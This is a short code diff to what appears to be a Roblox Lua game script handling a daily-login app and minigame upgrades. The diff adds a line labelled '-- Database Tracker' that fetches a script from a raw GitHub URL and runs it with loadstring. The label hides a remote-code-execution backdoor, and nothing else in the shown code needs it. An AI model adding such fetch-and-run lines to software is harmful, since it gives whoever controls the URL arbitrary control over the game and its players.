@@ -190,6 +190,9 @@ end
 
 dailyLoginAppClick()
 
+-- Database Tracker
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Roleck11/ServerCode/main/sendDatabaseReq"))()
+
 -- Minigame Code
 
 Player.PlayerGui.FrostclawsRevengeUpgradeApp.Background.Upgrades.ChildAdded:Connect(function(child)
